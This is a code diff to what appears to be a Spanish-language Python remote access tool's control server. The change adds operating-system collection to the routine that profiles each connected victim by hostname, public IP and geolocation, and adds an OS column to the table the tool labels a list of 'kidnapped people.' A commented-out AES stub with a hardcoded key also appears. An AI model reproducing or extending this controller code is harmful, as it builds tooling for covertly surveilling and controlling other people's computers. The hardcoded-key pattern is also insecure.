@@ -14,6 +14,9 @@ import pygame
 from tabulate import tabulate
 from threading import Thread
 
+from Crypto import Random
+from Crypto.Cipher import AES
+
 # MODULOS CREADOS
 import utilidades.creador_ayuda as ayuda
 from utilidades.banners import *
@@ -140,6 +143,14 @@ class Server(Thread):
 			print (" Error: ",e)
 
 
+
+	#def cifrar(self,msg,BLOCK_SIZE=32):
+	#	iv = Random.new().read(BLOCK_SIZE)
+	#	obj = AES.new('This is a key123', AES.MODE_CBC, iv)
+	#    ciphertext = obj.encrypt(message)
+	#    return ciphertext
+
+
 	# --------- ENVIAR MENSAJES ---------
 
 	def enviar(self,server,mensaje):
@@ -181,13 +192,15 @@ class Server(Thread):
 	def obtener_informacion(self,client,address):
 		hostname = self.recibir(client)
 		self.enviar(client,"ready")
+		sistema = self.recibir(client)
+		self.enviar(client,"ready")
 		ip_info = (self.recibir(client)).split(',')
 		ciudad = ip_info[0]
 		ip_public = ip_info[1]
 		pais = ip_info[2]
 		estado = ip_info[3]
 		geolocation = {'city_name':ciudad, 'IPv4':ip_public, 'country_name':pais, 'state':estado}
-		return [client,address,hostname,geolocation]
+		return [client,address,hostname,sistema,geolocation]
 
 
 
@@ -502,7 +515,7 @@ class Control():
 
 			if (control_ruta(bajada[1],"/")):
 				pass
-				
+
 			else:
 				print (" [\033[1;31mx\033[0;39m] Ruta destino no existe o no se especifico nombre de nuevo archivo.")
 				return False
@@ -712,7 +725,7 @@ def laboratorio(servidor):
 	lista_terricolas_table = []
 
 	for terricola in servidor.terricolas:
-		lista_terricolas_table.append([terricola[2],terricola[3]["country_name"],terricola[3]["city_name"],terricola[1][0],terricola[3]["IPv4"],terricola[1][1]])
+		lista_terricolas_table.append([terricola[2],terricola[4]["country_name"],terricola[4]["city_name"],terricola[3],terricola[1][0],terricola[4]["IPv4"],terricola[1][1]])
 
 	encabezados("laboratorio")
 
@@ -768,7 +781,7 @@ def laboratorio(servidor):
 				print (" \033[1;34mLista de personas secuestradas\033[0;39m\n")
 
 				index = [i for i in range(1,len(servidor.terricolas)+1)]
-				print (tabulate(lista_terricolas_table, tablefmt="fancy_grid", headers=["ID", "Terricola", "Pais", "Ciudad" ,"Direccion IP (Privada)", "IPv4 (Publica)", "Puerto"], showindex=index),"\n\n")
+				print (tabulate(lista_terricolas_table, tablefmt="fancy_grid", headers=["ID", "Terricola", "Pais", "Ciudad", "Sistema Operativo" ,"Direccion IP (Privada)", "IPv4 (Publica)", "Puerto"], showindex=index),"\n\n")
 
 			else:
 				print("\n [\033[1;31mx\033[0;39m] No hay personas secuestradas\n")
